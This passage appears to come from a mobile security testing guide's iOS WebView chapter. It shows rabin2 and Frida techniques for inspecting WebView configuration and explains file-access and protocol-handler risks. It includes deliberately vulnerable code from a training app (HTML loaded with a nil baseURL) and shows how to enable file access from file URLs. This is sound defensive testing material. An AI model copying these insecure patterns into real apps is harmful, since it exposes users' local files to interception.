\paragraph{Overview}\label{overview-65}}

WebViews are in-app browser components for displaying interactive web
content. They can be used to embed web content directly into an app's
user interface. iOS WebViews support JavaScript execution by default, so
script injection and Cross-Site Scripting attacks can affect them.

\hypertarget{uiwebview}{%
\subparagraph{UIWebView}\label{uiwebview}}

\href{https://developer.apple.com/reference/uikit/uiwebview}{\texttt{UIWebView}}
is deprecated starting on iOS 12 and should not be used. Make sure that
either \texttt{WKWebView} or \texttt{SFSafariViewController} are used to
embed web content. In addition to that, JavaScript cannot be disabled
for \texttt{UIWebView} which is another reason to refrain from using it.

\hypertarget{wkwebview}{%
\subparagraph{WKWebView}\label{wkwebview}}

\href{https://developer.apple.com/reference/webkit/wkwebview}{\texttt{WKWebView}}
was introduced with iOS 8 and is the appropriate choice for extending
app functionality, controlling displayed content (i.e., prevent the user
from navigating to arbitrary URLs) and customizing. \texttt{WKWebView}
also increases the performance of apps that are using WebViews
significantly, through the Nitro JavaScript engine {[}\#thiel2{]}.

\texttt{WKWebView} comes with several security advantages over
\texttt{UIWebView}:

\begin{itemize}
\tightlist
\item
  JavaScript is enabled by default but thanks to the
  \texttt{javaScriptEnabled} property of \texttt{WKWebView}, it can be
  completely disabled, preventing all script injection flaws.
\item
  The \texttt{JavaScriptCanOpenWindowsAutomatically} can be used to
  prevent JavaScript from opening new windows, such as pop-ups.
\item
  The \texttt{hasOnlySecureContent} property can be used to verify
  resources loaded by the WebView are retrieved through encrypted
  connections.
\item
  \texttt{WKWebView} implements out-of-process rendering, so memory
  corruption bugs won't affect the main app process.
\end{itemize}

A JavaScript Bridge can be enabled when using \texttt{WKWebView}s (and
\texttt{UIWebView}s). See Section
``\protect\hyperlink{determining-whether-native-methods-are-exposed-through-webviews-mstg-platform-7}{Determining
Whether Native Methods Are Exposed Through WebViews}'' below for more
information.

\hypertarget{sfsafariviewcontroller}{%
\subparagraph{SFSafariViewController}\label{sfsafariviewcontroller}}

\href{https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller}{\texttt{SFSafariViewController}}
is available starting on iOS 9 and should be used to provide a
generalized web viewing experience. These WebViews can be easily spotted
as they have a characteristic layout which includes the following
elements:

\begin{itemize}
\tightlist
\item
  A read-only address field with a security indicator.
\item
  An Action (``Share'') button.
\item
  A Done button, back and forward navigation buttons, and a ``Safari''
  button to open the page directly in Safari.
\end{itemize}

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/aa3dda3347111e374cb9b24068c0d2054439c109.png}
\caption{Images/Chapters/0x06h/sfsafariviewcontroller.png}
\end{figure}

There are a couple of things to consider:

\begin{itemize}
\tightlist
\item
  JavaScript cannot be disabled in \texttt{SFSafariViewController} and
  this is one of the reasons why the usage of \texttt{WKWebView} is
  recommended when the goal is extending the app's user interface.
\item
  \texttt{SFSafariViewController} also shares cookies and other website
  data with Safari.
\item
  The user's activity and interaction with a
  \texttt{SFSafariViewController} are not visible to the app, which
  cannot access AutoFill data, browsing history, or website data.
\item
  According to the App Store Review Guidelines,
  \texttt{SFSafariViewController}s may not be hidden or obscured by
  other views or layers.
\end{itemize}

This should be sufficient for an app analysis and therefore,
\texttt{SFSafariViewController}s are out of scope for the Static and
Dynamic Analysis sections.

\hypertarget{static-analysis-72}{%
\paragraph{Static Analysis}\label{static-analysis-72}}

For the static analysis we will focus mostly on the following points
having \texttt{UIWebView} and \texttt{WKWebView} under scope.

\begin{itemize}
\tightlist
\item
  Identifying WebView usage
\item
  Testing JavaScript configuration
\item
  Testing for mixed content
\item
  Testing for WebView URI manipulation
\end{itemize}

\hypertarget{identifying-webview-usage}{%
\subparagraph{Identifying WebView
Usage}\label{identifying-webview-usage}}

Look out for usages of the above mentioned WebView classes by searching
in Xcode.

In the compiled binary you can search in its symbols or strings like
this:

UIWebView

\begin{verbatim}
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
\end{verbatim}

WKWebView

\begin{verbatim}
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
\end{verbatim}

Alternatively you can also search for known methods of these WebView
classes. For example, search for the method used to initialize a
WKWebView
(\href{https://developer.apple.com/documentation/webkit/wkwebview/1414998-init}{\texttt{init(frame:configuration:)}}):

\begin{verbatim}
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
\end{verbatim}

You can also demangle it:

\begin{verbatim}
$ xcrun swift-demangle __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO

---> @nonobjc __C.WKWebView.init(frame: __C_Synthesized.CGRect,
                                configuration: __C.WKWebViewConfiguration) -> __C.WKWebView
\end{verbatim}

\hypertarget{testing-javascript-configuration}{%
\subparagraph{Testing JavaScript
Configuration}\label{testing-javascript-configuration}}

First of all, rememeber that JavaScript cannot be disabled for
\texttt{UIWebVIews}.

For \texttt{WKWebView}s, as a best practice, JavaScript should be
disabled unless it is explicitly required. To verify that JavaScript was
properly disabled search the project for usages of
\texttt{WKPreferences} and ensure that the
\href{https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled}{\texttt{javaScriptEnabled}}
property is set to \texttt{false}:

\begin{verbatim}
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
\end{verbatim}

If only having the compiled binary you can search for this in it:

\begin{verbatim}
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled:
\end{verbatim}

If user scripts were defined, they will continue running as the
\texttt{javaScriptEnabled} property won't affect them. See
\href{https://developer.apple.com/documentation/webkit/wkusercontentcontroller}{WKUserContentController}
and
\href{https://developer.apple.com/documentation/webkit/wkuserscript}{WKUserScript}
for more information on injecting user scripts to WKWebViews.

\hypertarget{testing-for-mixed-content}{%
\subparagraph{Testing for Mixed
Content}\label{testing-for-mixed-content}}

In contrast to \texttt{UIWebView}s, when using \texttt{WKWebView}s it is
possible to detect
\href{https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en}{mixed
content} (HTTP content loaded from a HTTPS page). By using the method
\href{https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent}{\texttt{hasOnlySecureContent}}
it can be verified whether all resources on the page have been loaded
through securely encrypted connections. This example from {[}\#thiel2{]}
(see page 159 and 160) uses this to ensure that only content loaded via
HTTPS is shown to the user, otherwise an alert is displayed telling the
user that mixed content was detected.

In the compiled binary:

\begin{verbatim}
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"

# nothing found
\end{verbatim}

In this case, the app does not make use of this.

In addition, if you have the original source code or the IPA, you can
inspect the embedded HTML files and verify that they do not include
mixed content. Search for \texttt{http://} in the source and inside tag
attributes, but remember that this might give false positives as, for
example, finding an anchor tag \texttt{\textless{}a\textgreater{}} that
includes a \texttt{http://} inside its \texttt{href} attribute does not
always present a mixed content issue. Learn more about mixed content in
\href{https://developers.google.com/web/fundamentals/security/prevent-mixed-content/what-is-mixed-content?hl=en}{Google's
Web Developers guide}.

\hypertarget{dynamic-analysis-68}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-68}}

For the dynamic analysis we will address the same points from the static
analysis.

\begin{itemize}
\tightlist
\item
  Enumerating WebView instances
\item
  Checking if JavaScript is enabled
\item
  Verifying that only secure content is allowed
\end{itemize}

It is possible to identify WebViews and obtain all their properties on
runtime by performing dynamic instrumentation. This is very useful when
you don't have the original source code.

For the following examples, we will keep using the
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/}{``Where's
My Browser?''} app and Frida REPL.

\hypertarget{enumerating-webview-instances}{%
\subparagraph{Enumerating WebView
Instances}\label{enumerating-webview-instances}}

Once you've identified a WebView in the app, you may inspect the heap in
order to find instances of one or several of the WebViews that we have
seen above.

For example, if you use Frida you can do so by inspecting the heap via
``ObjC.choose()''

\begin{Shaded}
\begin{Highlighting}[]
\VariableTok{ObjC}\NormalTok{.}\AttributeTok{choose}\NormalTok{(}\VariableTok{ObjC}\NormalTok{.}\AttributeTok{classes}\NormalTok{[}\StringTok{\textquotesingle{}UIWebView\textquotesingle{}}\NormalTok{]}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onMatch}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (ui) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}onMatch: \textquotesingle{}}\OperatorTok{,}\NormalTok{ ui)}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}URL: \textquotesingle{}}\OperatorTok{,} \VariableTok{ui}\NormalTok{.}\AttributeTok{request}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
  \OperatorTok{\},}
  \DataTypeTok{onComplete}\OperatorTok{:} \KeywordTok{function}\NormalTok{ () }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}done for UIWebView!\textquotesingle{}}\NormalTok{)}\OperatorTok{;}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}

\VariableTok{ObjC}\NormalTok{.}\AttributeTok{choose}\NormalTok{(}\VariableTok{ObjC}\NormalTok{.}\AttributeTok{classes}\NormalTok{[}\StringTok{\textquotesingle{}WKWebView\textquotesingle{}}\NormalTok{]}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onMatch}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (wk) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}onMatch: \textquotesingle{}}\OperatorTok{,}\NormalTok{ wk)}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}URL: \textquotesingle{}}\OperatorTok{,} \VariableTok{wk}\NormalTok{.}\AttributeTok{URL}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
  \OperatorTok{\},}
  \DataTypeTok{onComplete}\OperatorTok{:} \KeywordTok{function}\NormalTok{ () }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}done for WKWebView!\textquotesingle{}}\NormalTok{)}\OperatorTok{;}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}

\VariableTok{ObjC}\NormalTok{.}\AttributeTok{choose}\NormalTok{(}\VariableTok{ObjC}\NormalTok{.}\AttributeTok{classes}\NormalTok{[}\StringTok{\textquotesingle{}SFSafariViewController\textquotesingle{}}\NormalTok{]}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onMatch}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (sf) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}onMatch: \textquotesingle{}}\OperatorTok{,}\NormalTok{ sf)}\OperatorTok{;}
  \OperatorTok{\},}
  \DataTypeTok{onComplete}\OperatorTok{:} \KeywordTok{function}\NormalTok{ () }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}done for SFSafariViewController!\textquotesingle{}}\NormalTok{)}\OperatorTok{;}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

For the \texttt{UIWebView} and \texttt{WKWebView} WebViews we also print
the assotiated URL for the sake of completion.

In order to ensure that you will be able to find the instances of the
WebViews in the heap, be sure to first navigate to the WebView you've
found. Once there, run the code above, e.g.~by copying into the Frida
REPL:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U }\VariableTok{com}\NormalTok{.}\VariableTok{authenticationfailure}\NormalTok{.}\AttributeTok{WheresMyBrowser}

\NormalTok{\# copy the code and }\VariableTok{wait}\NormalTok{ ...}

\NormalTok{onMatch}\OperatorTok{:}  \OperatorTok{<}\NormalTok{UIWebView}\OperatorTok{:} \BaseNTok{0x14fd25e50}\OperatorTok{;}\NormalTok{ frame }\OperatorTok{=}\NormalTok{ (}\DecValTok{0} \DecValTok{126}\OperatorTok{;} \DecValTok{320} \DecValTok{393}\NormalTok{)}\OperatorTok{;}
\NormalTok{                autoresize }\OperatorTok{=}\NormalTok{ RM}\OperatorTok{+}\NormalTok{BM}\OperatorTok{;}\NormalTok{ layer }\OperatorTok{=} \OperatorTok{<}\NormalTok{CALayer}\OperatorTok{:} \BaseNTok{0x1c422d100}\OperatorTok{>>}
\NormalTok{URL}\OperatorTok{:}  \OperatorTok{<}\NormalTok{NSMutableURLRequest}\OperatorTok{:} \BaseNTok{0x1c000ef00}\OperatorTok{>} \OperatorTok{\{}
  \DataTypeTok{URL}\OperatorTok{:} \DataTypeTok{file}\OperatorTok{:}\CommentTok{///var/mobile/Containers/Data/Application/A654D169{-}1DB7{-}429C{-}9DB9{-}A871389A8BAA/}
\NormalTok{          Library}\OperatorTok{/}\NormalTok{UIWebView}\OperatorTok{/}\VariableTok{scenario1}\NormalTok{.}\AttributeTok{html}\OperatorTok{,}\NormalTok{ Method GET}\OperatorTok{,}\NormalTok{ Headers }\OperatorTok{\{}
\NormalTok{    Accept }\OperatorTok{=}\NormalTok{     (}
        \StringTok{"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
\NormalTok{    )}\OperatorTok{;}
    \StringTok{"Upgrade{-}Insecure{-}Requests"} \OperatorTok{=}\NormalTok{     (}
        \DecValTok{1}
\NormalTok{    )}\OperatorTok{;}
    \StringTok{"User{-}Agent"} \OperatorTok{=}\NormalTok{     (}
        \StringTok{"Mozilla/5.0 (iPhone; CPU iPhone ... AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/..."}
\NormalTok{    )}\OperatorTok{;}
\OperatorTok{\}} \OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

Now we quit with \texttt{q} and open another WebView (\texttt{WKWebView}
in this case). It also gets detected if we repeat the previous steps:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U }\VariableTok{com}\NormalTok{.}\VariableTok{authenticationfailure}\NormalTok{.}\AttributeTok{WheresMyBrowser}

\NormalTok{\# copy the code and }\VariableTok{wait}\NormalTok{ ...}

\NormalTok{onMatch}\OperatorTok{:}  \OperatorTok{<}\NormalTok{WKWebView}\OperatorTok{:} \BaseNTok{0x1508b1200}\OperatorTok{;}\NormalTok{ frame }\OperatorTok{=}\NormalTok{ (}\DecValTok{0} \DecValTok{0}\OperatorTok{;} \DecValTok{320} \DecValTok{393}\NormalTok{)}\OperatorTok{;}\NormalTok{ layer }\OperatorTok{=} \OperatorTok{<}\NormalTok{CALayer}\OperatorTok{:} \BaseNTok{0x1c4238f20}\OperatorTok{>>}
\NormalTok{URL}\OperatorTok{:}\NormalTok{  file}\OperatorTok{:}\CommentTok{///var/mobile/Containers/Data/Application/A654D169{-}1DB7{-}429C{-}9DB9{-}A871389A8BAA/}
\NormalTok{            Library}\OperatorTok{/}\NormalTok{WKWebView}\OperatorTok{/}\VariableTok{scenario1}\NormalTok{.}\AttributeTok{html}
\end{Highlighting}
\end{Shaded}

We will extend this example in the following sections in order to get
more information from the WebViews. We recommend to store this code to a
file, e.g.~webviews\_inspector.js and run it like this:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U }\VariableTok{com}\NormalTok{.}\VariableTok{authenticationfailure}\NormalTok{.}\AttributeTok{WheresMyBrowser} \OperatorTok{{-}}\NormalTok{l }\VariableTok{webviews\_inspector}\NormalTok{.}\AttributeTok{js}
\end{Highlighting}
\end{Shaded}

\hypertarget{checking-if-javascript-is-enabled}{%
\subparagraph{Checking if JavaScript is
Enabled}\label{checking-if-javascript-is-enabled}}

Remember that if a \texttt{UIWebView} is being used, JavaScript is
enabled by default and there's no possibility to disable it.

For \texttt{WKWebView}, you should verify if JavaScript is enabled. Use
\href{https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled}{\texttt{javaScriptEnabled}}
from \texttt{WKPreferences} for this.

Extend the previous script with the following line:

\begin{Shaded}
\begin{Highlighting}[]

\VariableTok{ObjC}\NormalTok{.}\AttributeTok{choose}\NormalTok{(}\VariableTok{ObjC}\NormalTok{.}\AttributeTok{classes}\NormalTok{[}\StringTok{\textquotesingle{}WKWebView\textquotesingle{}}\NormalTok{]}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onMatch}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (wk) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}onMatch: \textquotesingle{}}\OperatorTok{,}\NormalTok{ wk)}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}javaScriptEnabled:\textquotesingle{}}\OperatorTok{,} \VariableTok{wk}\NormalTok{.}\AttributeTok{configuration}\NormalTok{().}\AttributeTok{preferences}\NormalTok{().}\AttributeTok{javaScriptEnabled}\NormalTok{())}\OperatorTok{;}
\CommentTok{//...}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

The output shows now that, in fact, JavaScript is enabled:

\begin{verbatim}
$ frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

javaScriptEnabled:  true
\end{verbatim}

\hypertarget{verifying-that-only-secure-content-is-allowed}{%
\subparagraph{Verifying that Only Secure Content is
Allowed}\label{verifying-that-only-secure-content-is-allowed}}

\texttt{UIWebView}'s do not provide a method for this. However, you may
inspect if the system enables the ``Upgrade-Insecure-Requests'' CSP
(Content Security Policy) directive by calling the \texttt{request}
method of each \texttt{UIWebView} instance
(``Upgrade-Insecure-Requests''
\href{https://www.thesslstore.com/blog/ios-10-will-support-upgrade-insecure-requests/}{should
be available starting on iOS 10} which included a new version of WebKit,
the browser engine powering the iOS WebViews). See an example in the
previous section
``\protect\hyperlink{enumerating-webview-instances}{Enumerating WebView
Instances}''.

For \texttt{WKWebView}'s, you may call the method
\href{https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent}{\texttt{hasOnlySecureContent}}
for each of the \texttt{WKWebView}s found in the heap. Remember to do so
once the WebView has loaded.

Extend the previous script with the following line:

\begin{Shaded}
\begin{Highlighting}[]
\VariableTok{ObjC}\NormalTok{.}\AttributeTok{choose}\NormalTok{(}\VariableTok{ObjC}\NormalTok{.}\AttributeTok{classes}\NormalTok{[}\StringTok{\textquotesingle{}WKWebView\textquotesingle{}}\NormalTok{]}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onMatch}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (wk) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}onMatch: \textquotesingle{}}\OperatorTok{,}\NormalTok{ wk)}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}hasOnlySecureContent: \textquotesingle{}}\OperatorTok{,} \VariableTok{wk}\NormalTok{.}\AttributeTok{hasOnlySecureContent}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \CommentTok{//...}
      \OperatorTok{\}}
    \OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

The output shows that some of the resources on the page have been loaded
through insecure connections:

\begin{verbatim}
$ frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
\end{verbatim}

\hypertarget{testing-for-webview-uri-manipulation}{%
\subparagraph{Testing for WebView URI
Manipulation}\label{testing-for-webview-uri-manipulation}}

Make sure that the WebView's URI cannot be manipulated by the user in
order to load other types of resources than necessary for the
functioning of the WebView. This can be specifically dangerous when the
WebView's content is loaded from the local file system, allowing the
user to navigate to other resources within the application.

\hypertarget{testing-webview-protocol-handlers-mstg-platform-6-1}{%
\subsubsection{Testing WebView Protocol Handlers
(MSTG-PLATFORM-6)}\label{testing-webview-protocol-handlers-mstg-platform-6-1}}

\hypertarget{overview-66}{%
\paragraph{Overview}\label{overview-66}}

Several default schemes are available that are being interpreted in a
WebView on iOS, for example:

\begin{itemize}
\tightlist
\item
  http(s)://
\item
  file://
\item
  tel://
\end{itemize}

WebViews can load remote content from an endpoint, but they can also
load local content from the app data directory. If the local content is
loaded, the user shouldn't be able to influence the filename or the path
used to load the file, and users shouldn't be able to edit the loaded
file.

Use the following best practices as defensive-in-depth measures:

\begin{itemize}
\tightlist
\item
  Create a whitelist that defines local and remote web pages and URL
  schemes that are allowed to be loaded.
\item
  Create checksums of the local HTML/JavaScript files and check them
  while the app is starting up.
  \href{https://en.wikipedia.org/wiki/Minification_\%28programming\%29}{Minify
  JavaScript files} ``Minification (programming)'') to make them harder
  to read.
\end{itemize}

\hypertarget{static-analysis-73}{%
\paragraph{Static Analysis}\label{static-analysis-73}}

\begin{itemize}
\tightlist
\item
  Testing how WebViews are loaded
\item
  Testing WebView file access
\item
  Checking telephone number detection
\end{itemize}

\hypertarget{testing-how-webviews-are-loaded}{%
\subparagraph{Testing How WebViews are
Loaded}\label{testing-how-webviews-are-loaded}}

If a WebView is loading content from the app data directory, users
should not be able to change the filename or path from which the file is
loaded, and they shouldn't be able to edit the loaded file.

This presents an issue especially in \texttt{UIWebView}s loading
untrusted content via the deprecated methods
\href{https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc}{\texttt{loadHTMLString:baseURL:}}
or
\href{https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc}{\texttt{loadData:MIMEType:textEncodingName:baseURL:}}
and setting the \texttt{baseURL} parameter to \texttt{nil} or to a
\texttt{file:} or \texttt{applewebdata:} URL schemes. In this case, in
order to prevent unauthorized access to local files, the best option is
to set it instead to \texttt{about:blank}. However, the recommendation
is to avoid the use of \texttt{UIWebView}s and switch to
\texttt{WKWebView}s instead.

Here's an example of a vulnerable \texttt{UIWebView} from
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/master/WheresMyBrowser/UIWebViewController.swift\#L219}{``Where's
My Browser?''}:

\begin{verbatim}
let scenario2HtmlPath = Bundle.main.url(forResource: "web/UIWebView/scenario2.html", withExtension: nil)
do {
    let scenario2Html = try String(contentsOf: scenario2HtmlPath!, encoding: .utf8)
    uiWebView.loadHTMLString(scenario2Html, baseURL: nil)
} catch {}
\end{verbatim}

The page loads resources from the internet using HTTP, enabling a
potential MITM to exfiltrate secrets contained in local files, e.g.~in
shared preferences.

When working with \texttt{WKWebView}s, Apple recommends using
\href{https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc}{\texttt{loadHTMLString:baseURL:}}/\href{https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc}{\texttt{loadData:MIMEType:textEncodingName:baseURL:}}
to load local HTML files and \texttt{loadRequest:} for web content.
Typically, the local files are loaded in combination with methods
including, among others:
\href{https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource}{\texttt{pathForResource:ofType:}},
\href{https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc}{\texttt{URLForResource:withExtension:}}
or
\href{https://developer.apple.com/documentation/swift/string/3126736-init}{\texttt{init(contentsOf:encoding:)}}.

Search the source code for the mentioned methods and inspect their
parameters.

Example in Objective-C:

\begin{verbatim}
- (void)viewDidLoad
{
    [super viewDidLoad];
    WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];

    self.webView = [[WKWebView alloc] initWithFrame:CGRectMake(10, 20,
        CGRectGetWidth([UIScreen mainScreen].bounds) - 20,
        CGRectGetHeight([UIScreen mainScreen].bounds) - 84) configuration:configuration];
    self.webView.navigationDelegate = self;
    [self.view addSubview:self.webView];

    NSString *filePath = [[NSBundle mainBundle] pathForResource:@"example_file" ofType:@"html"];
    NSString *html = [NSString stringWithContentsOfFile:filePath
                                encoding:NSUTF8StringEncoding error:nil];
    [self.webView loadHTMLString:html baseURL:[NSBundle mainBundle].resourceURL];
}
\end{verbatim}

Example in Swift from
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/master/WheresMyBrowser/WKWebViewController.swift\#L196}{``Where's
My Browser?''}:

\begin{verbatim}
let scenario2HtmlPath = Bundle.main.url(forResource: "web/WKWebView/scenario2.html", withExtension: nil)
do {
    let scenario2Html = try String(contentsOf: scenario2HtmlPath!, encoding: .utf8)
    wkWebView.loadHTMLString(scenario2Html, baseURL: nil)
} catch {}
\end{verbatim}

If only having the compiled binary, you can also search for these
methods, e.g.:

\begin{verbatim}
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
\end{verbatim}

In a case like this, it is recommended to perform dynamic analysis to
ensure that this is in fact being used and from which kind of WebView.
The \texttt{baseURL} parameter here doesn't present an issue as it will
be set to ``null'' but could be an issue if not set properly when using
a \texttt{UIWebView}. See ``Checking How WebViews are Loaded'' for an
example about this.

In addition, you should also verify if the app is using the method
\href{https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc}{\texttt{loadFileURL:allowingReadAccessToURL:}}.
Its first parameter is \texttt{URL} and contains the URL to be loaded in
the WebView, its second parameter \texttt{allowingReadAccessToURL} may
contain a single file or a directory. If containing a single file, that
file will be available to the WebView. However, if it contains a
directory, all files on that directory will be made available to the
WebView. Therefore, it is worth inspecting this and in case it is a
directory, verifying that no sensitive data can be found inside it.

Example in Swift from
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/master/WheresMyBrowser/WKWebViewController.swift\#L186}{``Where's
My Browser?''}:

\begin{verbatim}
var scenario1Url = FileManager.default.urls(for: .libraryDirectory, in: .userDomainMask)[0]
scenario1Url = scenario1Url.appendingPathComponent("WKWebView/scenario1.html")
wkWebView.loadFileURL(scenario1Url, allowingReadAccessTo: scenario1Url)
\end{verbatim}

In this case, the parameter \texttt{allowingReadAccessToURL} contains a
single file ``WKWebView/scenario1.html'', meaning that the WebView has
exclusively access to that file.

In the compiled binary:

\begin{verbatim}
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadFileURL"
237 0x0002dff1 37 (4.__TEXT.__objc_methname) ascii loadFileURL:allowingReadAccessToURL:
\end{verbatim}

\hypertarget{testing-webview-file-access}{%
\subparagraph{Testing WebView File
Access}\label{testing-webview-file-access}}

If you have found a \texttt{UIWebView} being used, then the following
applies:

\begin{itemize}
\tightlist
\item
  The \texttt{file://} scheme is always enabled.
\item
  File access from \texttt{file://} URLs is always enabled.
\item
  Universal access from \texttt{file://} URLs is always enabled.
\end{itemize}

Regarding \texttt{WKWebView}s:

\begin{itemize}
\tightlist
\item
  The \texttt{file://} scheme is also always enabled and it
  \textbf{cannot be disabled}.
\item
  It disables file access from \texttt{file://} URLs by default but it
  can be enabled.
\end{itemize}

The following WebView properties can be used to configure file access:

\begin{itemize}
\tightlist
\item
  \texttt{allowFileAccessFromFileURLs} (\texttt{WKPreferences},
  \texttt{false} by default): it enables JavaScript running in the
  context of a \texttt{file://} scheme URL to access content from other
  \texttt{file://} scheme URLs.
\item
  \texttt{allowUniversalAccessFromFileURLs}
  (\texttt{WKWebViewConfiguration}, \texttt{false} by default): it
  enables JavaScript running in the context of a \texttt{file://} scheme
  URL to access content from any origin.
\end{itemize}

For example, it is possible to set the
\textbf{\href{https://github.com/WebKit/webkit/blob/master/Source/WebKit/UIProcess/API/Cocoa/WKPreferences.mm\#L470}{undocumented
property}} \texttt{allowFileAccessFromFileURLs} by doing this:

Objective-C:

\begin{verbatim}
[webView.configuration.preferences setValue:@YES forKey:@"allowFileAccessFromFileURLs"];
\end{verbatim}

Swift:

\begin{verbatim}
